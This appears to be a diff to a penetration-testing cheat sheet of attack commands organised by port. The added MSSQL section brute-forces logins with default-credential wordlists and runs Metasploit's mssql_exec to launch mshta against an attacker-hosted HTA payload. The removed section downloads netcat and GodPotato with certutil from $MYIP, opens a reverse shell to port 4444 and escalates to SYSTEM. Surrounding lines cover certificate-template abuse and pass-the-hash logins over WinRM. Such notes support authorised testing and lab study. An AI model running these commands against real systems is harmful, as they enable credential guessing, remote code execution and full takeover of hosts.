@@ -385,6 +385,14 @@ rlogin $USERNAME@$TARGET
 certipy-ad find -u '$USERNAME' -p '$PASSWORD' -dc-ip $TARGET -vulnerable -enabled -stdout
 certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096' -k -no-pass
 
+[*] (1433) MSSQL
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
+cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
+msfconsole -x -q "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $TARGET; run;"
+msfconsole -x -q "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; set USER_FILE /tmp/mssqlusernames; set PASS_FILE /tmp/mssqlpasswords; run;"
+msfconsole -x -q "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
+sessions -i 1
+
 [*] (3389) RDP
 xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
 xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard
@@ -392,14 +400,6 @@ xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-res
 [*] (5985) WINRM
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
-
-[*] MSSQL
-netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "C:\programdata\GodPotato-NET4.exe -cmd \"cmd /c C:\programdata\nc.exe -e cmd.exe $MYIP 4444\""'
-
-netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "cmd /c mshta.exe http://$MYIP:8080/cf9J5o.hta"'
-sessions -i 1 -c 'C:\programdata\GodPotato-NET4.exe -cmd "cmd /c whoami /priv"'
-sessions -i 1 -C 'getsystem'
-sessions -i 1
 
 # Post-Exploitation 
 ## Fileserver
